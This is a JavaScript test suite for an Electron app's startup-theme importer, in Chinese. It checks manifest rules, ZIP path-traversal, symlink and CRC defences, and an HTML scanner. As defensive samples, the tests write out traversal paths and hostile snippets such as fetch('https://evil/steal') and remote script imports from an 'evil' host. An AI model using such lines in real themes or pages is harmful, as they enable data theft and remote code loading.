import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, readFile, writeFile, mkdir, rm, readdir } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { zipSync, strToU8 } from 'fflate'
import { validateStartupThemeManifest, importStartupTheme, listStartupThemes, selectStartupTheme, deleteStartupTheme, resolveStartupTheme, validateThemeHtml } from '../lib/types/electron/startup-themes.js'
import { readStartupThemeArchive, validateThemePath } from '../lib/types/electron/startup-theme-archive.js'
import { readStartupThemeId } from '../lib/types/electron/startup-settings.js'

const assets = resolve('assets')
const manifest = { formatVersion: 1, id: 'sample', name: '示例', version: '1.0.0', type: 'html', entry: 'content/index.html' }
async function fixture(run) {
  const home = await mkdtemp(join(tmpdir(), 'corum-theme-'))
  try { await run(home) } finally { await rm(home, { recursive: true, force: true }) }
}
async function pack(home, fields = {}, extra = {}) {
  const value = { ...manifest, ...fields }
  const zip = zipSync({ 'manifest.json': strToU8(JSON.stringify(value)), [value.entry]: strToU8('<h1>theme</h1>'), ...extra })
  const path = join(home, 'theme.zip')
  await writeFile(path, zip)
  return path
}

test('主题 manifest 接受 HTML/视频，拒绝不支持版本、类型和包外路径', () => {
  assert.equal(validateStartupThemeManifest(manifest).id, 'sample')
  assert.equal(validateStartupThemeManifest({ ...manifest, type: 'video', entry: 'content/startup.webm' }).type, 'video')
  for (const patch of [{ formatVersion: 2 }, { id: '../escape' }, { id: 'CON' }, { type: 'script' }, { name: '' }, { version: '' }, { entry: '../index.html' }, { entry: 'C:/index.html' }, { entry: 'content\\index.html' }, { entry: 'content/index.html:stream' }, { preview: 'preview.svg' }, { background: 'red' }]) {
    assert.throws(() => validateStartupThemeManifest({ ...manifest, ...patch }))
  }
})

test('segments 分段视频校验：合法放行、重复 stage 拒绝、缺 ready 拒绝、非 video 拒绝', () => {
  const base = { formatVersion: 1, id: 'seg', name: '分段', version: '1.0.0', type: 'video' }
  // 阶段集合已固定为 env/plugins/mounting/ready（2026-10-17：spawn 并入 env）。
  const goodSegs = [
    { stage: 'env', file: 'segments/env.mp4' },
    { stage: 'plugins', file: 'segments/plugins.mp4' },
    { stage: 'mounting', file: 'segments/mounting.mp4' },
    { stage: 'ready', file: 'segments/ready.mp4' },
  ]
  // 合法：有 segments 时 entry 可省略
  const ok = validateStartupThemeManifest({ ...base, segments: goodSegs })
  assert.deepEqual(ok.segments, goodSegs)
  assert.equal(ok.entry, undefined)
  // 合法：有 segments 且同时保留 entry（fallback）
  const withEntry = validateStartupThemeManifest({ ...base, entry: 'fallback.mp4', segments: goodSegs })
  assert.equal(withEntry.entry, 'fallback.mp4')
  // 合法：只有两段（env + ready）也行
  assert.ok(validateStartupThemeManifest({ ...base, segments: [{ stage: 'env', file: 'e.mp4' }, { stage: 'ready', file: 'r.mp4' }] }).segments)
  // 已删除的 spawn 现在是**无效** stage（协议收紧，防止旧主题静默塞回来）
  assert.throws(() => validateStartupThemeManifest({
    ...base,
    segments: [{ stage: 'spawn', file: 'segments/spawn.mp4' }, { stage: 'ready', file: 'segments/ready.mp4' }],
  }), /stage 无效/)
  // 缺 entry 且缺 segments → 拒绝
  assert.throws(() => validateStartupThemeManifest({ ...base }), /entry/)
  // 重复 stage → 拒绝
  assert.throws(() => validateStartupThemeManifest({ ...base, segments: [...goodSegs, { stage: 'env', file: 'dup.mp4' }] }), /重复/)
  // 缺 ready 段 → 拒绝（取除 ready 外的全部）
  assert.throws(() => validateStartupThemeManifest({
    ...base, segments: goodSegs.filter(seg => seg.stage !== 'ready'),
  }), /ready/)
  // 非法 stage 名 → 拒绝
  assert.throws(() => validateStartupThemeManifest({
    ...base, segments: [...goodSegs.filter(seg => seg.stage !== 'ready'), { stage: 'done', file: 'r.mp4' }],
  }), /stage/)
  // 非 video 类型带 segments → 拒绝
  assert.throws(() => validateStartupThemeManifest({ ...base, type: 'html', entry: 'index.html', segments: goodSegs }), /video/)
  // segment 缺 file → 拒绝
  assert.throws(() => validateStartupThemeManifest({
    ...base, segments: [...goodSegs.filter(seg => seg.stage !== 'ready'), { stage: 'ready' }],
  }))
  // segment file 非 mp4/webm → 拒绝
  assert.throws(() => validateStartupThemeManifest({
    ...base, segments: [...goodSegs.filter(seg => seg.stage !== 'ready'), { stage: 'ready', file: 'r.avi' }],
  }), /视频文件类型/)
  // segment file 越界 → 拒绝
  assert.throws(() => validateStartupThemeManifest({
    ...base, segments: [...goodSegs.filter(seg => seg.stage !== 'ready'), { stage: 'ready', file: '../escape.mp4' }],
  }), /越界/)
  // segments 非数组 → 拒绝
  assert.throws(() => validateStartupThemeManifest({ ...base, segments: 'bad' }))
  // segments 空数组 → 拒绝
  assert.throws(() => validateStartupThemeManifest({ ...base, segments: [] }))
})

test('导入安装内容但不改变选择，切换持久化且保留其他偏好', () => fixture(async home => {
  await writeFile(join(home, 'desktop-settings.json'), JSON.stringify({ startupAnimationEnabled: false, other: 'kept' }))
  const installed = await importStartupTheme(await pack(home), home)
  assert.equal(installed.id, 'sample')
  assert.equal(await readFile(join(home, 'startup-themes/sample/content/index.html'), 'utf8'), '<h1>theme</h1>')
  assert.equal(readStartupThemeId(home), 'corum-terminal')
  await selectStartupTheme('sample', assets, home)
  assert.equal(readStartupThemeId(home), 'sample')
  assert.equal((await resolveStartupTheme(assets, undefined, home)).info.id, 'sample')
  assert.equal((await listStartupThemes(assets, home)).selectedId, 'sample')
  assert.equal(JSON.parse(await readFile(join(home, 'desktop-settings.json'), 'utf8')).other, 'kept')
  await assert.rejects(importStartupTheme(await pack(home), home), /已安装/)
  assert.equal(readStartupThemeId(home), 'sample')
}))

test('视频可以安装，删除当前主题回退内置，内置主题不能删除', () => fixture(async home => {
  await importStartupTheme(await pack(home, { type: 'video', entry: 'content/startup.mp4' }), home)
  await selectStartupTheme('sample', assets, home)
  await deleteStartupTheme('sample', home)
  assert.equal(readStartupThemeId(home), 'corum-terminal')
  // The segmented video is the only builtin — the legacy HTML animation is retired.
  assert.equal((await listStartupThemes(assets, home)).themes.length, 1)
  await assert.rejects(deleteStartupTheme('corum-terminal', home), /内置/)
}))

test('分段视频主题可导入安装，segment 文件解析到子目录', () => fixture(async home => {
  const segManifest = { formatVersion: 1, id: 'segvid', name: '分段视频', version: '1.0.0', type: 'video',
    segments: [
      { stage: 'env', file: 'segments/env.mp4' },
      { stage: 'plugins', file: 'segments/plugins.mp4' },
      { stage: 'ready', file: 'segments/ready.mp4' },
    ] }
  const zip = zipSync({
    'manifest.json': strToU8(JSON.stringify(segManifest)),
    'segments/env.mp4': strToU8('env'),
    'segments/plugins.mp4': strToU8('plugins'),
    'segments/ready.mp4': strToU8('ready'),
  })
  const path = join(home, 'seg.zip')
  await writeFile(path, zip)
  const installed = await importStartupTheme(path, home)
  assert.equal(installed.id, 'segvid')
  assert.equal(installed.segments.length, 3)
  assert.equal(installed.entry, undefined)
  // 子目录文件存在
  assert.equal(await readFile(join(home, 'startup-themes/segvid/segments/env.mp4'), 'utf8'), 'env')
  await selectStartupTheme('segvid', assets, home)
  const resolved = await resolveStartupTheme(assets, undefined, home)
  assert.equal(resolved.info.id, 'segvid')
  assert.ok(resolved.info.segments.length === 3)
  // 缺 segment 文件 → 拒绝
  const badZip = zipSync({ 'manifest.json': strToU8(JSON.stringify(segManifest)), 'segments/env.mp4': strToU8('x'), 'segments/spawn.mp4': strToU8('x') })
  const badPath = join(home, 'bad-seg.zip')
  await writeFile(badPath, badZip)
  await assert.rejects(importStartupTheme(badPath, home), /分段视频不存在/)
}))

test('主题损坏或缺失时回退，目录内未完成安装不显示', () => fixture(async home => {
  await mkdir(join(home, 'startup-themes/broken'), { recursive: true })
  await writeFile(join(home, 'startup-themes/broken/manifest.json'), '{}')
  assert.equal((await resolveStartupTheme(assets, 'missing', home)).info.id, 'corum-terminal')
  assert.equal((await listStartupThemes(assets, home)).themes.length, 1)
  await assert.rejects(selectStartupTheme('broken', assets, home))
}))

test('缺少入口的导入失败不留下主题或修改选择', () => fixture(async home => {
  const path = join(home, 'bad.zip')
  await writeFile(path, zipSync({ 'manifest.json': strToU8(JSON.stringify(manifest)) }))
  await assert.rejects(importStartupTheme(path, home), /入口/)
  assert.equal(readStartupThemeId(home), 'corum-terminal')
  assert.deepEqual(await readdir(join(home, 'startup-themes')).catch(() => []), [])
}))

test('ZIP 拒绝越界路径、Windows 别名、重复条目和 symlink', () => fixture(async home => {
  for (const name of ['../escape', '/absolute', 'C:/escape', 'dir\\escape', 'a:stream', 'file.', 'CON.txt']) {
    const path = await pack(home, {}, { [name]: strToU8('x') })
    await assert.rejects(readStartupThemeArchive(path), undefined, name)
  }
  await assert.rejects(readStartupThemeArchive(await pack(home, {}, { 'CONTENT/INDEX.HTML': strToU8('duplicate') })), /重复/)
  const linkZip = zipSync({ link: [strToU8('/outside'), { os: 3, attrs: 0o120777 << 16 }] })
  await writeFile(join(home, 'link.zip'), linkZip)
  await assert.rejects(readStartupThemeArchive(join(home, 'link.zip')), /链接/)
}))

test('ZIP 核对本地头、解压大小和 CRC，按实际字节限量解压', () => fixture(async home => {
  const good = await readFile(await pack(home))
  const localMismatch = Buffer.from(good)
  localMismatch[30] ^= 1
  await writeFile(join(home, 'mismatch.zip'), localMismatch)
  await assert.rejects(readStartupThemeArchive(join(home, 'mismatch.zip')), /不一致/)
  const wrongSize = Buffer.from(good)
  const central = wrongSize.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]))
  wrongSize.writeUInt32LE(1, central + 24)
  await writeFile(join(home, 'size.zip'), wrongSize)
  await assert.rejects(readStartupThemeArchive(join(home, 'size.zip')))
  await assert.rejects(readStartupThemeArchive(join(home, 'theme.zip'), { maxBytes: 4 }), /大小/)
  await assert.rejects(readStartupThemeArchive(join(home, 'theme.zip'), { maxFiles: 1 }), /数量/)
  const files = await readStartupThemeArchive(join(home, 'theme.zip'))
  assert.equal(files.get('content/index.html').length, 14)
}))

test('ZIP 目录条目也受数量上限约束，避免大量空目录阻塞导入', () => fixture(async home => {
  const path = join(home, 'directories.zip')
  await writeFile(path, zipSync({ 'a/': new Uint8Array(), 'b/': new Uint8Array() }))
  await assert.rejects(readStartupThemeArchive(path, { maxFiles: 1 }), /数量/)
}))

test('主题 JSON Schema 的路径约定与运行期校验一致', async () => {
  const schema = JSON.parse(await readFile('startup-theme-kit/theme.schema.json', 'utf8'))
  const pathPattern = new RegExp(schema.$defs.path.pattern)
  for (const path of ['content/index.html', '中文/主题.html', 'font/my font.woff2', '../x', 'a/./b', 'a//b', 'a\\b', 'a\0b', 'CON.txt', 'a:stream', 'a/file.', '/absolute']) {
    let valid = true
    try { validateThemePath(path) } catch { valid = false }
    assert.equal(pathPattern.test(path), valid, path)
  }
})

test('validateThemeHtml 拒绝危险模式，放行合法 HTML', () => {
  // 合法：引用 SDK、内联脚本、corumapp 资源、普通字面量
  assert.doesNotThrow(() => validateThemeHtml('<!doctype html><script src="corumapp://startup-sdk/corum-startup-sdk.js"></script>'))
  assert.doesNotThrow(() => validateThemeHtml('<link rel="stylesheet" href="corumapp://startup-theme/x/style.css">'))
  assert.doesNotThrow(() => validateThemeHtml('const word = "import"; const r = "require"; // 字面量不匹配'))
  // 危险模式逐条拒绝
  assert.throws(() => validateThemeHtml('<iframe src="x"></iframe>'), /iframe/)
  assert.throws(() => validateThemeHtml('<object data="x"></object>'), /object/)
  assert.throws(() => validateThemeHtml('<embed src="x">'), /embed/)
  assert.throws(() => validateThemeHtml('require("fs")'), /require/)
  assert.throws(() => validateThemeHtml('import x from "https://evil/x.js"'), /import/)
  assert.throws(() => validateThemeHtml('fetch("https://evil/steal")'), /fetch/)
  assert.throws(() => validateThemeHtml('new XMLHttpRequest()'), /XMLHttpRequest/)
  assert.throws(() => validateThemeHtml('<script src="https://evil/x.js"></script>'), /script/)
  assert.throws(() => validateThemeHtml('<link rel="stylesheet" href="http://evil/x.css">'), /link/)
})

test('导入时对 HTML 入口静态扫描，危险模式被拒绝且不留主题', () => fixture(async home => {
  const path = join(home, 'evil.zip')
  const zip = zipSync({
    'manifest.json': strToU8(JSON.stringify(manifest)),
    'content/index.html': strToU8('<iframe src="https://evil"></iframe>'),
  })
  await writeFile(path, zip)
  await assert.rejects(importStartupTheme(path, home), /iframe/)
  assert.deepEqual(await readdir(join(home, 'startup-themes')).catch(() => []), [])
}))
